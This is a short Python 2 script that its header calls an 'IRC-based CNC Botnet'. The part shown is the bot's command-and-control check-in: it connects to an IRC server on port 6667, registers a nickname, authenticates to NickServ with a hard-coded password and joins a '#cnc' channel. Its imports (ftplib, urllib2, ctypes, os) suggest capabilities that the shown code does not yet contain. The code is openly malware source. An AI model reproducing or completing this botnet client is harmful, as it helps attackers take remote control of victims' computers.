#!/usr/bin/python
#IRC-based CNC Botnet
#Luke Matarazzo
#Jackcson Sadowski

import socket
import ftplib
import urllib2
import urllib
import sys
import ctypes
import random
import time
import platform
import os

#IRC Settings
server = "server"
channel = "#cnc"
botnick = "cncnick"




#THIS SECTION IS FOR CONNECTION TO THE SERVER
#Connecting to the IRC Server
irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  #defines the socket
print "connecting to: "+server
irc.connect((server, 6667))  #connects to the server
irc.send("USER "+ botnick +" "+ botnick +" "+ botnick +" :This is a fun bot!\n")  #user authentication
irc.send("NICK "+ botnick +"\n")  #sets nick
irc.send("PRIVMSG nickserv :iNOOPE\r\n")  #auth
irc.send("JOIN "+ channel +"\n")  #join the channel
